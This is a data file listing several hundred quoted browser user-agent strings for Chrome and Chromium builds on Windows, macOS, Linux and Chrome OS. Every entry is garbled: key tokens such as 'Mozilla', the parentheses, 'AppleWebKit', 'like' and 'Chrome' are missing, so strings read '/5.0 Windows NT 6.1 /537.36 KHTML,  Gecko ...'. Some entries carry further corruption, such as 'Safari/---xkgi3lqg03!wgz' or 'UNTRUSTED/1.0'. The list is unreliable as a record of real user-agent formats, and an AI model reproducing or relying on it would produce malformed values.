	"/5.0 Windows NT 5.1 /537.36 KHTML,  Gecko /31.0.1650.16 Safari/537.36"
	"/5.0 Windows NT 6.1; WOW64 /537.36 KHTML,  Gecko /31.0.1623.0 Safari/537.36"
	"/5.0 Windows NT 6.2; WOW64 /537.36 KHTML,  Gecko /30.0.1599.17 Safari/537.36"
	"/5.0 Windows NT 6.1; WOW64 /537.36 KHTML,  Gecko /29.0.1547.62 Safari/537.36"
	"/5.0 X11; CrOS i686 4319.74.0 /537.36 KHTML,  Gecko /29.0.1547.57 Safari/537.36"
	"/5.0 Windows NT 6.2; WOW64 /537.36 KHTML,  Gecko /29.0.1547.2 Safari/537.36"
	"/5.0 Windows NT 6.1 /537.36 KHTML,  Gecko /28.0.1468.0 Safari/537.36"
	"/5.0 Windows NT 6.2 /537.36 KHTML,  Gecko /28.0.1467.0 Safari/537.36"
	"/5.0 Windows NT 6.2 /537.36 KHTML,  Gecko /28.0.1464.0 Safari/537.36"
	"/5.0 Windows NT 6.2; WOW64 /537.36 KHTML,  Gecko /27.0.1500.55 Safari/537.36"
	"/5.0 Windows NT 6.2; WOW64 /537.36 KHTML,  Gecko /27.0.1453.93 Safari/537.36"
	"/5.0 Windows NT 6.1; WOW64 /537.36 KHTML,  Gecko /27.0.1453.93 Safari/537.36"
	"/5.0 Windows NT 6.1 /537.36 KHTML,  Gecko /27.0.1453.93 Safari/537.36"
	"/5.0 Windows NT 5.1 /537.36 KHTML,  Gecko /27.0.1453.93 Safari/537.36"
	"/5.0 Macintosh; Intel Mac OS X 10_8_3 /537.36 KHTML,  Gecko /27.0.1453.93 Safari/537.36"
	"/5.0 Macintosh; Intel Mac OS X 10_7_5 /537.36 KHTML,  Gecko /27.0.1453.93 Safari/537.36"
	"/5.0 Windows NT 6.1 /537.36 KHTML,  Gecko /27.0.1453.90 Safari/537.36"
	"/5.0 X11; NetBSD /537.36 KHTML,  Gecko /27.0.1453.116 Safari/537.36"
	"/5.0 X11; CrOS i686 3912.101.0 /537.36 KHTML,  Gecko /27.0.1453.116 Safari/537.36"
	"/5.0 Windows NT 6.1; WOW64 /537.17 KHTML,  Gecko /24.0.1312.60 Safari/537.17"
	"/5.0 Macintosh; Intel Mac OS X 10_8_2 /537.17 KHTML,  Gecko /24.0.1309.0 Safari/537.17"
	"/5.0 Windows NT 6.2; WOW64 /537.15 KHTML,  Gecko /24.0.1295.0 Safari/537.15"
	"/5.0 Windows NT 6.2; WOW64 /537.14 KHTML,  Gecko /24.0.1292.0 Safari/537.14"
	"/5.0 Windows NT 6.2; WOW64 /537.13 KHTML,  Gecko /24.0.1290.1 Safari/537.13"
	"/5.0 Windows NT 6.2 /537.13 KHTML,  Gecko /24.0.1290.1 Safari/537.13"
	"/5.0 Macintosh; Intel Mac OS X 10_8_2 /537.13 KHTML,  Gecko /24.0.1290.1 Safari/537.13"
	"/5.0 Macintosh; Intel Mac OS X 10_7_4 /537.13 KHTML,  Gecko /24.0.1290.1 Safari/537.13"
	"/5.0 Windows NT 6.1 /537.13 KHTML,  Gecko /24.0.1284.0 Safari/537.13"
	"/5.0 Windows NT 5.1 /537.11 KHTML,  Gecko /23.0.1271.6 Safari/537.11"
	"/5.0 Macintosh; Intel Mac OS X 10_8_2 /537.11 KHTML,  Gecko /23.0.1271.6 Safari/537.11"
	"/5.0 Windows NT 6.2 /537.11 KHTML,  Gecko /23.0.1271.26 Safari/537.11"
	"/5.0 Windows NT 6.0 yi; /345667.12221 KHTML,  Gecko /23.0.1271.26 Safari/453667.1221"
	"/5.0 Windows NT 6.2; WOW64 /537.11 KHTML,  Gecko /23.0.1271.17 Safari/537.11"
	"/5.0 Windows NT 6.2 /537.4 KHTML,  Gecko /22.0.1229.94 Safari/537.4"
	"/5.0 Macintosh; Intel Mac OS X 10_6_0 /537.4 KHTML,  Gecko /22.0.1229.79 Safari/537.4"
	"/5.0 Windows NT 6.1 /537.2 KHTML,  Gecko /22.0.1216.0 Safari/537.2"
	"/5.0 Windows NT 6.1; WOW64 /537.1 KHTML,  Gecko /22.0.1207.1 Safari/537.1"
	"/5.0 X11; CrOS i686 2268.111.0 /536.11 KHTML,  Gecko /20.0.1132.57 Safari/536.11"
	"/5.0 Windows NT 6.1; WOW64 /536.6 KHTML,  Gecko /20.0.1092.0 Safari/536.6"
	"/5.0 Windows NT 6.2 /536.6 KHTML,  Gecko /20.0.1090.0 Safari/536.6"
	"/5.0 Windows NT 6.2; WOW64 /537.1 KHTML,  Gecko /19.77.34.5 Safari/537.1"
	"/5.0 X11; Linux x86_64 /536.5 KHTML,  Gecko /19.0.1084.9 Safari/536.5"
	"/5.0 X11; FreeBSD amd64 /536.5 KHTML  Gecko /19.0.1084.56 Safari/1EA69"
	"/5.0 Windows NT 6.0 /536.5 KHTML,  Gecko /19.0.1084.36 Safari/536.5"
	"/5.0 Windows NT 6.1; WOW64 /536.3 KHTML,  Gecko /19.0.1063.0 Safari/536.3"
	"/5.0 Windows NT 5.1 /536.3 KHTML,  Gecko /19.0.1063.0 Safari/536.3"
	"/5.0 Macintosh; Intel Mac OS X 10_8_0 /536.3 KHTML,  Gecko /19.0.1063.0 Safari/536.3"
	"/5.0 Windows NT 6.2 /536.3 KHTML,  Gecko /19.0.1062.0 Safari/536.3"
	"/5.0 Windows NT 6.1; WOW64 /536.3 KHTML,  Gecko /19.0.1062.0 Safari/536.3"
	"/5.0 Windows NT 6.2 /536.3 KHTML,  Gecko /19.0.1061.1 Safari/536.3"
	"/5.0 Windows NT 6.1; WOW64 /536.3 KHTML,  Gecko /19.0.1061.1 Safari/536.3"
	"/5.0 Windows NT 6.1 /536.3 KHTML,  Gecko /19.0.1061.1 Safari/536.3"
	"/5.0 Windows NT 6.2 /536.3 KHTML,  Gecko /19.0.1061.0 Safari/536.3"
	"/5.0 X11; Linux x86_64 /535.24 KHTML,  Gecko /19.0.1055.1 Safari/535.24"
	"/5.0 Windows NT 6.2; WOW64 /535.24 KHTML,  Gecko /19.0.1055.1 Safari/535.24"
	"/5.0 Macintosh; Intel Mac OS X 10_7_2 /535.24 KHTML,  Gecko /19.0.1055.1 Safari/535.24"
	"/5.0 Macintosh; Intel Mac OS X 10_7_3 /535.22 KHTML,  Gecko /19.0.1047.0 Safari/535.22"
	"/5.0 X11; Linux x86_64 /535.21 KHTML,  Gecko /19.0.1042.0 Safari/535.21"
	"/5.0 X11; Linux i686 /535.21 KHTML,  Gecko /19.0.1041.0 Safari/535.21"
	"/5.0 Macintosh; Intel Mac OS X 10_7_3 /535.20 KHTML,  Gecko /19.0.1036.7 Safari/535.20"
	"/5.0 Windows NT 6.1 /535.2 KHTML,  Gecko /18.6.872.0 Safari/535.2 UNTRUSTED/1.0 - UNTRUSTED/1.0"
	"/5.0 Macintosh; AMD Mac OS X 10_8_2 /535.22 KHTML,  Gecko /18.6.872"
	"/5.0 X11; CrOS i686 1660.57.0 /535.19 KHTML,  Gecko /18.0.1025.46 Safari/535.19"
	"/5.0 Windows NT 6.0; WOW64 /535.19 KHTML,  Gecko /18.0.1025.45 Safari/535.19"
	"/5.0 Macintosh; Intel Mac OS X 10_7_2 /535.19 KHTML,  Gecko /18.0.1025.45 Safari/535.19"
	"/5.0 Macintosh; Intel Mac OS X 10_6_8 /535.19 KHTML,  Gecko /18.0.1025.45 Safari/535.19"
	"/5.0 Macintosh; Intel Mac OS X 10_6_8 /535.19 KHTML,  Gecko /18.0.1025.166 Safari/535.19"
	"/5.0 Macintosh; Intel Mac OS X 10_5_8 /535.19 KHTML,  Gecko /18.0.1025.151 Safari/535.19"
	"/5.0 X11; Linux x86_64 /535.19 KHTML,  Gecko /11.10 Chromium/18.0.1025.142 /18.0.1025.142 Safari/535.19"
	"/5.0 Macintosh; Intel Mac OS X 10_6_8 /535.19 KHTML,  Gecko /18.0.1025.11 Safari/535.19"
	"/5.0 X11; Linux x86_64 /535.11 KHTML,  Gecko /17.0.963.66 Safari/535.11"
	"/5.0 X11; Linux i686 /535.11 KHTML,  Gecko /17.0.963.66 Safari/535.11"
	"/5.0 Windows NT 6.2; WOW64 /535.11 KHTML,  Gecko /17.0.963.66 Safari/535.11"
	"/5.0 Windows NT 6.2 /535.11 KHTML,  Gecko /17.0.963.66 Safari/535.11"
	"/5.0 Windows NT 6.1; WOW64 /535.11 KHTML,  Gecko /17.0.963.66 Safari/535.11"
	"/5.0 Windows NT 6.1 /535.11 KHTML,  Gecko /17.0.963.66 Safari/535.11"
	"/5.0 Windows NT 6.0; WOW64 /535.11 KHTML,  Gecko /17.0.963.66 Safari/535.11"
	"/5.0 Windows NT 6.0 /535.11 KHTML,  Gecko /17.0.963.66 Safari/535.11"
	"/5.0 Windows NT 5.1 /535.11 KHTML,  Gecko /17.0.963.66 Safari/535.11"
	"/5.0 Macintosh; Intel Mac OS X 10_7_3 /535.11 KHTML,  Gecko /17.0.963.66 Safari/535.11"
	"/5.0 Macintosh; Intel Mac OS X 10_7_2 /535.11 KHTML,  Gecko /17.0.963.66 Safari/535.11"
	"/5.0 Macintosh; Intel Mac OS X 10_6_8 /535.11 KHTML,  Gecko /17.0.963.66 Safari/535.11"
	"/5.0 Macintosh; Intel Mac OS X 10_5_8 /535.11 KHTML,  Gecko /17.0.963.66 Safari/535.11"
	"/5.0 X11; Linux x86_64 /535.11 KHTML,  Gecko /11.10 Chromium/17.0.963.65 /17.0.963.65 Safari/535.11"
	"/5.0 X11; Linux x86_64 /535.11 KHTML,  Gecko /11.04 Chromium/17.0.963.65 /17.0.963.65 Safari/535.11"
	"/5.0 X11; Linux x86_64 /535.11 KHTML,  Gecko /10.10 Chromium/17.0.963.65 /17.0.963.65 Safari/535.11"
	"/5.0 X11; Linux i686 /535.11 KHTML,  Gecko /11.10 Chromium/17.0.963.65 /17.0.963.65 Safari/535.11"
	"/5.0 X11; Linux i686 /535.11 KHTML,  Gecko /17.0.963.65 Safari/535.11"
	"/5.0 X11; FreeBSD amd64 /535.11 KHTML,  Gecko /17.0.963.65 Safari/535.11"
	"/5.0 Windows NT 6.2; WOW64 /535.11 KHTML,  Gecko /17.0.963.65 Safari/535.11"
	"/5.0 Macintosh; Intel Mac OS X 10_7_2 /535.11 KHTML,  Gecko /17.0.963.65 Safari/535.11"
	"/5.0 Macintosh; Intel Mac OS X 10_7_0 /535.11 KHTML,  Gecko /17.0.963.65 Safari/535.11"
	"/5.0 Macintosh; Intel Mac OS X 10_6_4 /535.11 KHTML,  Gecko /17.0.963.65 Safari/535.11"
	"/5.0 X11; Linux x86_64 /535.11 KHTML,  Gecko /11.04 Chromium/17.0.963.56 /17.0.963.56 Safari/535.11"
	"/5.0 X11; Linux i686 /535.11 KHTML,  Gecko /17.0.963.56 Safari/535.11"
	"/5.0 Windows NT 6.1; WOW64 /535.11 KHTML,  Gecko /17.0.963.56 Safari/535.11"
	"/5.0 Windows NT 6.0; WOW64 /535.11 KHTML,  Gecko /17.0.963.56 Safari/535.11"
	"/5.0 X11; Linux x86_64 /535.11 KHTML,  Gecko /17.0.963.12 Safari/535.11"
	"/5.0 Windows NT 6.1; WOW64 /535.8 KHTML,  Gecko /17.0.940.0 Safari/535.8"
	"/5.0 Windows NT 6.1 /535.7 KHTML,  Gecko /16.0.912.77 Safari/---xkgi3lqg03!wgz"
	"/5.0 X11; CrOS i686 1193.158.0 /535.7 KHTML,  Gecko /16.0.912.75 Safari/535.7"
	"/5.0 Windows NT 6.0; WOW64 /535.7 KHTML,  Gecko /16.0.912.75 Safari/535.7"
	"/5.0 Windows NT 6.0 /535.7 KHTML,  Gecko /16.0.912.75 Safari/535.7"
	"/5.0 Windows NT 6.1; WOW64 /535.7 KHTML,  Gecko /16.0.912.63 Safari/"
	"/5.0 Windows NT 6.1 /535.8 KHTML,  Gecko /16.0.912.63 Safari/535.8"
	"/5.0 Windows NT 5.2; WOW64 /535.7 KHTML,  Gecko /16.0.912.63 Safari/535.7"
	"/5.0 Windows NT 6.1; WOW64 /535.7 KHTML,  Gecko /16.0.912.36 Safari/535.7"
	"/5.0 Windows NT 6.0; WOW64 /535.7 KHTML,  Gecko /16.0.912.36 Safari/535.7"
	"/5.0 Macintosh; Intel Mac OS X 10_6_8 /535.7 KHTML,  Gecko /16.0.912.36 Safari/535.7"
	"/5.0 Windows NT 5.1 /535.6 KHTML,  Gecko /16.0.897.0 Safari/535.6"
	"/5.0 Macintosh; Intel Mac OS X 10_6_8 /535.2 KHTML,  Gecko /15.0.874.54 Safari/535.2"
	"/5.0 X11; FreeBSD i386 /535.2 KHTML,  Gecko /15.0.874.121 Safari/535.2"
	"/5.0 X11; Linux i686 /535.2 KHTML,  Gecko /11.10 Chromium/15.0.874.120 /15.0.874.120 Safari/535.2"
	"/5.0 Windows NT 6.0 /535.2 KHTML,  Gecko /15.0.874.120 Safari/535.2"
	"/5.0 Windows NT 5.1 /535.2 KHTML,  Gecko /15.0.872.0 Safari/535.2"
	"/5.0 X11; Linux x86_64 /535.2 KHTML,  Gecko /11.04 Chromium/15.0.871.0 /15.0.871.0 Safari/535.2"
	"/5.0 Windows NT 5.1 /535.2 KHTML,  Gecko /15.0.864.0 Safari/535.2"
	"/5.0 Windows NT 6.1 /535.2 KHTML,  Gecko /15.0.861.0 Safari/535.2"
	"/5.0 Macintosh; Intel Mac OS X 10_7_0 /535.2 KHTML,  Gecko /15.0.861.0 Safari/535.2"
	"/5.0 Macintosh; Intel Mac OS X 10_6_8 /535.2 KHTML,  Gecko /15.0.861.0 Safari/535.2"
	"/5.0 Windows NT 5.1 /535.2 KHTML,  Gecko /15.0.860.0 Safari/535.2"
	"/15.0.860.0 Windows; U; Windows NT 6.0; -US /533.20.25 KHTML,  Gecko /15.0.860.0"
	"/5.0 Macintosh; Intel Mac OS X 10_7_2 /535.1 KHTML,  Gecko /14.0.835.186 Safari/535.1"
	"/5.0 Macintosh; Intel Mac OS X 10_7_2 /535.1 KHTML,  Gecko /14.0.834.0 Safari/535.1"
	"/5.0 X11; Linux i686 /535.1 KHTML,  Gecko /11.04 Chromium/14.0.825.0 /14.0.825.0 Safari/535.1"
	"/5.0 X11; Linux x86_64 /535.1 KHTML,  Gecko /14.0.824.0 Safari/535.1"
	"/5.0 Windows NT 6.1 /535.1 KHTML,  Gecko /14.0.815.10913 Safari/535.1"
	"/5.0 Windows NT 5.1 /535.1 KHTML,  Gecko /14.0.815.0 Safari/535.1"
	"/5.0 X11; Linux i686 /535.1 KHTML,  Gecko /11.04 Chromium/14.0.814.0 /14.0.814.0 Safari/535.1"
	"/5.0 Windows NT 6.1; WOW64 /535.1 KHTML,  Gecko /14.0.814.0 Safari/535.1"
	"/5.0 X11; Linux i686 /535.1 KHTML,  Gecko /10.04 Chromium/14.0.813.0 /14.0.813.0 Safari/535.1"
	"/5.0 Windows NT 6.1; WOW64 /535.1 KHTML,  Gecko /14.0.813.0 Safari/535.1"
	"/5.0 Windows NT 5.2 /535.1 KHTML,  Gecko /14.0.813.0 Safari/535.1"
	"/5.0 Windows NT 5.1 /535.1 KHTML,  Gecko /14.0.813.0 Safari/535.1"
	"/5.0 Macintosh; Intel Mac OS X 10_6_7 /535.1 KHTML,  Gecko /14.0.813.0 Safari/535.1"
	"/5.0 Windows NT 6.1 /535.1 KHTML,  Gecko /14.0.812.0 Safari/535.1"
	"/5.0 Windows NT 6.1; WOW64 /535.1 KHTML,  Gecko /14.0.811.0 Safari/535.1"
	"/5.0 Windows NT 6.1; WOW64 /535.1 KHTML,  Gecko /14.0.810.0 Safari/535.1"
	"/5.0 Windows NT 5.1 /535.1 KHTML,  Gecko /14.0.810.0 Safari/535.1"
	"/5.0 Windows NT 5.1 /535.1 KHTML,  Gecko /14.0.809.0 Safari/535.1"
	"/5.0 X11; Linux x86_64 /535.1 KHTML,  Gecko /10.10 Chromium/14.0.808.0 /14.0.808.0 Safari/535.1"
	"/5.0 X11; Linux i686 /535.1 KHTML,  Gecko /10.04 Chromium/14.0.808.0 /14.0.808.0 Safari/535.1"
	"/5.0 X11; Linux i686 /535.1 KHTML,  Gecko /10.04 Chromium/14.0.804.0 /14.0.804.0 Safari/535.1"
	"/5.0 X11; Linux x86_64 /535.1 KHTML,  Gecko /14.0.803.0 Safari/535.1"
	"/5.0 X11; Linux i686 /535.1 KHTML,  Gecko /11.04 Chromium/14.0.803.0 /14.0.803.0 Safari/535.1"
	"/5.0 X11; Linux i686 /535.1 KHTML,  Gecko /14.0.803.0 Safari/535.1"
	"/5.0 Macintosh; Intel Mac OS X 10_7_0 /535.1 KHTML,  Gecko /14.0.803.0 Safari/535.1"
	"/5.0 Macintosh; Intel Mac OS X 10_6_7 /535.1 KHTML,  Gecko /14.0.803.0 Safari/535.1"
	"/5.0 Macintosh; Intel Mac OS X 10_5_8 /535.1 KHTML,  Gecko /14.0.803.0 Safari/535.1"
	"/5.0 Windows NT 6.1 /535.1 KHTML,  Gecko /14.0.801.0 Safari/535.1"
	"/5.0 Macintosh; Intel Mac OS X 10_5_8 /535.1 KHTML,  Gecko /14.0.801.0 Safari/535.1"
	"/5.0 Windows NT 5.2 /535.1 KHTML,  Gecko /14.0.794.0 Safari/535.1"
	"/5.0 Macintosh; Intel Mac OS X 10_7_0 /535.1 KHTML,  Gecko /14.0.794.0 Safari/535.1"
	"/5.0 Windows NT 6.0 /535.1 KHTML,  Gecko /14.0.792.0 Safari/535.1"
	"/5.0 Windows NT 5.2 /535.1 KHTML,  Gecko /14.0.792.0 Safari/535.1"
	"/5.0 Windows NT 5.1 /535.1 KHTML,  Gecko /14.0.792.0 Safari/535.1"
	"/5.0 Macintosh; PPC Mac OS X 10_6_7 /535.1 KHTML,  Gecko /14.0.790.0 Safari/535.1"
	"/5.0 Macintosh; Intel Mac OS X 10_6_7 /535.1 KHTML,  Gecko /14.0.790.0 Safari/535.1"
	"/5.0 Windows; U; Windows NT 6.1 /526.3 KHTML,  Gecko /14.0.564.21 Safari/526.3"
	"/5.0 X11; CrOS i686 13.587.48 /535.1 KHTML,  Gecko /13.0.782.43 Safari/535.1"
	"/5.0 /13.37 X11; U; Linux x86_64; -US /535.1 KHTML,  Gecko /13.0.782.41"
	"/5.0 ArchLinux X11; Linux x86_64 /535.1 KHTML,  Gecko /13.0.782.41 Safari/535.1"
	"/5.0 X11; Linux x86_64 /535.1 KHTML,  Gecko /11.04 Chromium/13.0.782.41 /13.0.782.41 Safari/535.1"
	"/5.0 X11; Linux x86_64 /535.1 KHTML,  Gecko /13.0.782.41 Safari/535.1"
	"/5.0 X11; Linux i686 /535.1 KHTML,  Gecko /13.0.782.41 Safari/535.1"
	"/5.0 Windows NT 6.0; WOW64 /535.1 KHTML,  Gecko /13.0.782.41 Safari/535.1"
	"/5.0 Windows NT 6.0 /535.1 KHTML,  Gecko /13.0.782.41 Safari/535.1"
	"/5.0 Windows NT 5.2; WOW64 /535.1 KHTML,  Gecko /13.0.782.41 Safari/535.1"
	"/5.0 Windows NT 5.1 /535.1 KHTML,  Gecko /13.0.782.41 Safari/535.1"
	"/5.0 Macintosh; Intel Mac OS X 10_6_7 /535.1 KHTML,  Gecko /13.0.782.41 Safari/535.1"
	"/5.0 Macintosh; Intel Mac OS X 10_6_3 /535.1 KHTML,  Gecko /13.0.782.41 Safari/535.1"
	"/5.0 Macintosh; Intel Mac OS X 10_6_2 /535.1 KHTML,  Gecko /13.0.782.41 Safari/535.1"
	"/5.0 Macintosh; Intel Mac OS X 10_6_3 /535.1 KHTML,  Gecko /13.0.782.32 Safari/535.1"
	"/5.0 X11; Linux amd64 /535.1 KHTML,  Gecko /13.0.782.24 Safari/535.1"
	"/5.0 Windows NT 6.1; WOW64 /535.1 KHTML,  Gecko /13.0.782.24 Safari/535.1"
	"/5.0 Macintosh; Intel Mac OS X 10_6_8 /535.1 KHTML,  Gecko /13.0.782.24 Safari/535.1"
	"/5.0 X11; Linux x86_64 /535.1 KHTML,  Gecko /13.0.782.220 Safari/535.1"
	"/5.0 Windows NT 6.0; WOW64 /535.1 KHTML,  Gecko /13.0.782.220 Safari/535.1"
	"/5.0 Windows NT 6.0 /535.1 KHTML,  Gecko /13.0.782.220 Safari/535.1"
	"/5.0 X11; Linux x86_64 /535.1 KHTML,  Gecko /13.0.782.215 Safari/535.1"
	"/5.0 X11; Linux i686 /535.1 KHTML,  Gecko /13.0.782.215 Safari/535.1"
	"/5.0 Windows NT 6.1 /535.1 KHTML,  Gecko /13.0.782.215 Safari/535.1"
	"/5.0 Macintosh; Intel Mac OS X 10_7_2 /535.1 KHTML,  Gecko /13.0.782.215 Safari/535.1"
	"/5.0 X11; U; Linux x86_64; -US /535.1 KHTML,  Gecko /13.0.782.20 Safari/535.1"
	"/5.0 X11; Linux x86_64 /535.1 KHTML,  Gecko /13.0.782.20 Safari/535.1"
	"/5.0 Windows NT 6.0 /535.1 KHTML,  Gecko /13.0.782.20 Safari/535.1"
	"/5.0 Windows NT 5.1 /535.1 KHTML,  Gecko /13.0.782.20 Safari/535.1"
	"/5.0 X11; CrOS i686 0.13.587 /535.1 KHTML,  Gecko /13.0.782.14 Safari/535.1"
	"/5.0 Windows; U; Windows NT 6.0; -US /535.1 KHTML,  Gecko /13.0.782.107 Safari/535.1"
	"/5.0 Macintosh; Intel Mac OS X 10_6_2 /535.1 KHTML,  Gecko /13.0.782.107 Safari/535.1"
	"/5.0 Windows NT 6.0 /535.1 KHTML,  Gecko /13.0.782.1 Safari/535.1"
	"/5.0 X11; Linux x86_64 /534.36 KHTML,  Gecko /13.0.766.0 Safari/534.36"
	"/5.0 X11; Linux amd64 /534.36 KHTML,  Gecko /13.0.766.0 Safari/534.36"
	"/5.0 X11; Linux i686 /534.35 KHTML,  Gecko /10.10 Chromium/13.0.764.0 /13.0.764.0 Safari/534.35"
	"/5.0 X11; CrOS i686 0.13.507 /534.35 KHTML,  Gecko /13.0.763.0 Safari/534.35"
	"/5.0 X11; Linux i686 /534.33 KHTML,  Gecko /9.10 Chromium/13.0.752.0 /13.0.752.0 Safari/534.33"
	"/5.0 Macintosh; Intel Mac OS X 10_5_8 /534.31 KHTML,  Gecko /13.0.748.0 Safari/534.31"
	"/5.0 Windows NT 6.1; -US /534.30 KHTML,  Gecko /12.0.750.0 Safari/534.30"
	"/5.0 X11; CrOS i686 12.433.109 /534.30 KHTML,  Gecko /12.0.742.93 Safari/534.30"
	"/5.0 X11; CrOS i686 12.0.742.91 /534.30 KHTML,  Gecko /12.0.742.93 Safari/534.30"
	"/5.0 /13.37 X11; U; Linux x86_64; -US /534.16 KHTML,  Gecko /12.0.742.91"
	"/5.0 X11; Linux i686 /534.30 KHTML,  Gecko /12.0.742.91 Chromium/12.0.742.91 Safari/534.30"
	"/5.0 Macintosh; Intel Mac OS X 10_6_8 /534.30 KHTML,  Gecko /12.0.742.68 Safari/534.30"
	"/5.0 ArchLinux X11; U; Linux x86_64; -US /534.30 KHTML,  Gecko /12.0.742.60 Safari/534.30"
	"/5.0 Windows NT 6.1; WOW64 /534.30 KHTML,  Gecko /12.0.742.53 Safari/534.30"
	"/5.0 Windows NT 6.1 /534.30 KHTML,  Gecko /12.0.742.113 Safari/534.30"
	"/5.0 X11; Linux x86_64 /534.30 KHTML,  Gecko /11.04 Chromium/12.0.742.112 /12.0.742.112 Safari/534.30"
	"/5.0 X11; Linux x86_64 /534.30 KHTML,  Gecko /10.10 Chromium/12.0.742.112 /12.0.742.112 Safari/534.30"
	"/5.0 X11; Linux x86_64 /534.30 KHTML,  Gecko /10.04 Chromium/12.0.742.112 /12.0.742.112 Safari/534.30"
	"/5.0 X11; Linux i686 /534.30 KHTML,  Gecko /11.04 Chromium/12.0.742.112 /12.0.742.112 Safari/534.30"
	"/5.0 X11; Linux i686 /534.30 KHTML,  Gecko /10.10 Chromium/12.0.742.112 /12.0.742.112 Safari/534.30"
	"/5.0 X11; Linux i686 /534.30 KHTML,  Gecko /10.04 Chromium/12.0.742.112 /12.0.742.112 Safari/534.30"
	"/5.0 Windows NT 7.1 /534.30 KHTML,  Gecko /12.0.742.112 Safari/534.30"
	"/5.0 Windows NT 5.2 /534.30 KHTML,  Gecko /12.0.742.112 Safari/534.30"
	"/5.0 Windows 8 /534.30 KHTML,  Gecko /12.0.742.112 Safari/534.30"
	"/5.0 Macintosh; Intel Mac OS X 10_6_6 /534.30 KHTML,  Gecko /12.0.742.112 Safari/534.30"
	"/5.0 Macintosh; Intel Mac OS X 10_6_4 /534.30 KHTML,  Gecko /12.0.742.112 Safari/534.30"
	"/5.0 X11; CrOS i686 12.433.216 /534.30 KHTML,  Gecko /12.0.742.105 Safari/534.30"
	"/5.0 ArchLinux X11; U; Linux x86_64; -US /534.30 KHTML,  Gecko /12.0.742.100 Safari/534.30"
	"/5.0 ArchLinux X11; U; Linux x86_64; -US /534.30 KHTML,  Gecko /12.0.742.100"
	"/5.0 X11; Linux i686 /534.30 KHTML,  Gecko //12.0.742.100 Safari/534.30"
	"/5.0 X11; Linux i686 /534.30 KHTML,  Gecko /12.0.742.100 Safari/534.30"
	"/5.0 Windows NT 6.0 /534.30 KHTML,  Gecko /12.0.742.100 Safari/534.30"
	"/5.0 Macintosh; Intel Mac OS X 10_7_0 /534.30 KHTML,  Gecko /12.0.742.100 Safari/534.30"
	"/5.0 Macintosh; Intel Mac OS X 10_6_4 /534.30 KHTML,  Gecko /12.0.742.100 Safari/534.30"
	"/5.0 Windows; U; Windows NT 5.1; -US /534.30 KHTML,  Gecko /12.0.724.100 Safari/534.30"
	"/5.0 Windows NT 5.1 /534.25 KHTML,  Gecko /12.0.706.0 Safari/534.25"
	"/5.0 Windows NT 5.1 /534.25 KHTML,  Gecko /12.0.704.0 Safari/534.25"
	"/5.0 X11; Linux x86_64 /534.24 KHTML,  Gecko /10.10 Chromium/12.0.703.0 /12.0.703.0 Safari/534.24"
	"/5.0 X11; Linux i686 /534.24 KHTML,  Gecko /10.10 Chromium/12.0.702.0 /12.0.702.0 Safari/534.24"
	"/5.0 Windows NT 6.1; WOW64 /534.24 KHTML,  Gecko /12.0.702.0 Safari/534.24"
	"/5.0 Windows NT 6.1 /534.24 KHTML,  Gecko /12.0.702.0 Safari/534.24"
	"/5.0 Windows NT 5.1 /534.24 KHTML,  Gecko /11.0.700.3 Safari/534.24"
	"/5.0 Windows NT 6.1 /534.24 KHTML,  Gecko /11.0.699.0 Safari/534.24"
	"/5.0 Windows NT 6.0; WOW64 /534.24 KHTML,  Gecko /11.0.699.0 Safari/534.24"
	"/5.0 Macintosh; Intel Mac OS X 10_6_6 /534.24 KHTML,  Gecko /11.0.698.0 Safari/534.24"
	"/5.0 Windows NT 6.1 /534.24 KHTML,  Gecko /11.0.697.0 Safari/534.24"
	"/5.0 Macintosh; Intel Mac OS X 10_6_8 /534.24 KHTML,  Gecko /11.0.696.71 Safari/534.24"
	"/5.0 Windows NT 6.1 /534.24 KHTML,  Gecko /11.0.696.68 Safari/534.24"
	"/5.0 Macintosh; Intel Mac OS X 10_6_7 /534.24 KHTML,  Gecko /11.0.696.68 Safari/534.24"
	"/5.0 Macintosh; Intel Mac OS X 10_5_8 /534.24 KHTML,  Gecko /11.0.696.68 Safari/534.24"
	"/5.0 /13.37 X11; U; Linux x86_64; -US /534.16 KHTML,  Gecko /11.0.696.50"
	"/5.0 Windows NT 5.1 /534.24 KHTML,  Gecko /11.0.696.43 Safari/534.24"
	"/5.0 X11; Linux x86_64 /534.24 KHTML,  Gecko /11.0.696.34 Safari/534.24"
	"/5.0 Windows NT 6.0; WOW64 /534.24 KHTML,  Gecko /11.0.696.34 Safari/534.24"
	"/5.0 X11; Linux x86_64 /534.24 KHTML,  Gecko /11.0.696.3 Safari/534.24"
	"/5.0 Windows NT 6.1 /534.24 KHTML,  Gecko /11.0.696.3 Safari/534.24"
	"/5.0 Windows NT 6.0 /534.24 KHTML,  Gecko /11.0.696.3 Safari/534.24"
	"/5.0 X11; Linux i686 /534.24 KHTML,  Gecko /11.0.696.14 Safari/534.24"
	"/5.0 Windows NT 6.1; WOW64 /534.24 KHTML,  Gecko /11.0.696.12 Safari/534.24"
	"/5.0 Macintosh; Intel Mac OS X 10_6_6 /534.24 KHTML,  Gecko /11.0.696.12 Safari/534.24"
	"/5.0 X11; Linux x86_64 /534.24 KHTML,  Gecko /10.04 Chromium/11.0.696.0 /11.0.696.0 Safari/534.24"
	"/5.0 Macintosh; Intel Mac OS X 10_7_0 /534.24 KHTML,  Gecko /11.0.696.0 Safari/534.24"
	"/5.0 Windows NT 6.1 /534.24 KHTML,  Gecko /11.0.694.0 Safari/534.24"
	"/5.0 X11; Linux i686 /534.23 KHTML,  Gecko /11.0.686.3 Safari/534.23"
	"/5.0 Windows; U; Windows NT 5.1; -US /534.21 KHTML,  Gecko /11.0.682.0 Safari/534.21"
	"/5.0 Windows; U; Windows NT 5.1; -US /534.21 KHTML,  Gecko /11.0.678.0 Safari/534.21"
	"/5.0 Macintosh; U; Intel Mac OS X 10_7_0; -US /534.21 KHTML,  Gecko /11.0.678.0 Safari/534.21"
	"/5.0 Windows; U; Windows NT 6.0; -US /534.20 KHTML,  Gecko /11.0.672.2 Safari/534.20"
	"/5.0 Windows NT /534.20 KHTML,  Gecko /11.0.672.2 Safari/534.20"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_6; -US /534.20 KHTML,  Gecko /11.0.672.2 Safari/534.20"
	"/5.0 Windows; U; Windows NT 6.1; -US /534.20 KHTML,  Gecko /11.0.669.0 Safari/534.20"
	"/5.0 Windows; U; Windows NT 5.1; -US /534.19 KHTML,  Gecko /11.0.661.0 Safari/534.19"
	"/5.0 Windows; U; Windows NT 5.1; -US /534.18 KHTML,  Gecko /11.0.661.0 Safari/534.18"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_6; -US /534.18 KHTML,  Gecko /11.0.660.0 Safari/534.18"
